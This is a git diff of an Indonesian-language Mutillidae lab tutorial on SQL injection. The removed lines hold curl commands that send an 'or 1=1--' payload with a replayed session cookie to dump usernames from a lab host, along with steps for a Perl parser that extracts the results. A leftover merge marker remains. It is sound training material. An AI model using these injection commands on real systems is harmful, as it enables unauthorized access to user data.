@@ -1,4 +1,4 @@
-Lesson 7 - SQL Injection, Burpsuite, cURL, Perl Parser
+Lesson 8 - SQL Injection Union Exploit #1
 -------
 
 ### # Mempersiapkan Burp Suite dan Firefox
@@ -48,35 +48,4 @@ Lesson 7 - SQL Injection, Burpsuite, cURL, Perl Parser
  ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_17_03_16.png)
  
  
- #### # Simulate CURL SQL Injection: (Method #2)
- - **Step 1** : Copy cookies PHPSESSID pada header request pada Burp Suite Bagian SQL Injection: Obtain Userlist (Method #1) **Step 6** dan simpan pada file crack_cookies.txt
- ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_17_49_09.png)
- - **Step 2** : Jalankan perintah
  
- `curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.151.36.64/mutillidae/index.php" | grep -i "Username=" | awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' | awk -F\> '{print $2}'`
- 
- - **Step 3** : Setelah menjalankan perintah, hasil dari curl sql injection dapat dilihat pada terminal.
- ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_17_57_09.png)
- ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_18_03_41.png)
- 
-#### # Perl Parser
-
- - **Step 1** : Download perl parser lesson 7 pada link berikut [http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson7/lesson7.pl.TXT](http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson7/lesson7.pl.TXT)
- 
- - **Step 2** : Ganti nama file lesson7.pl.TXT menjadi lesson7.pl, kemudian ubah permission file tersebut menjadi `rwx------` atau 700.
- ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_18_08_20.png)
-
- - **Step 3** : Jalankan perintah 
- `curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.151.36.64/mutillidae/index.php" | grep "Username=" > lesson7.txt`. Perintah tersebut akan menyimpan hasil curl pada file lesson7.txt
- 
- ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_18_11_36.png)
- 
- **Step 4** : Jalankan lesson7.pl dan kemudian lihat hasilnya.
- ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_18_14_03.png)
- 
- 
- 
- 
-
->>>>>>> Thoni/Lesson7
-
